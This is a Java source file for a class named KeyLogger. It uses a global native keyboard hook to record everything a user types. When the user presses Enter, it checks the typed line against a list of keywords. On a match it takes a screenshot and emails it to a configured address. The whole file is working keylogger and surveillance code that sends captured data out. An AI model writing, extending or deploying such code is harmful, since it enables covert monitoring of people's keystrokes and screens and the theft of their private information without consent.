package core;

import java.util.Arrays;
import java.util.List;
import java.util.Vector;

import javax.swing.SwingUtilities;
import javax.swing.UIManager;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

				
public class KeyLogger implements NativeKeyListener
{
	Vector<String> wordCharacters = new Vector<String>();
	String[] banedWords;
	StringBuilder stringBuilder = new StringBuilder("");
	String emailString;
	String keywordString;
    
    public KeyLogger(String emaiString, String keyString) {
    	this.emailString = emaiString;
    	this.keywordString = keyString;
    	this.banedWords = keyString.split(",");
	}
    
    
    /* Key Pressed */
    public void nativeKeyPressed(NativeKeyEvent e) {

    }

    /* Key Released */
    public void nativeKeyReleased(NativeKeyEvent e) {
    	String wordString = NativeKeyEvent.getKeyText(e.getKeyCode());
    	if(wordString.equals("Underfined") || wordString.equals("Unknown")) return;
        if(wordString.equals("Backspace")) {
        	if( wordCharacters.size() > 0) {
        		wordCharacters.removeElementAt(wordCharacters.size()-1);
        	}
        	return;
        }
        if(wordString.equals("Space")) {
        	wordCharacters.add(" ");
        	return;
        }
        if(!wordString.equals("Enter")) {
        	wordCharacters.add(wordString);
        	return;
        }
        else {
        	for(String wordString2 : wordCharacters) {
        		stringBuilder.append(wordString2);
        		
        	}
        	System.out.print(stringBuilder.toString());
        	for(String wString : banedWords) {
        		if(stringBuilder.toString().toLowerCase().contains(wString)) {
        			try {
        				try {
    						Thread.sleep(1000);
    					} catch (InterruptedException e1) {
    					}
        				ScreenCapture screenCapture = ScreenCapture.getScreenCapture();
        				String imagePathString = screenCapture.captureScreen();
        				System.out.println(imagePathString);
        				if(!imagePathString.isEmpty()) {
        					SendEmail senderEmail = SendEmail.getSendEmail();
        					senderEmail.send(imagePathString);
        				}
					} catch (Exception e2) {
						System.out.println(e2.toString());
						// TODO: handle exception
					}
            		
        		}
        	}
        	stringBuilder.setLength(0);
        	wordCharacters.clear();
        }
    }


    public void nativeKeyTyped(NativeKeyEvent e) {

    }

}
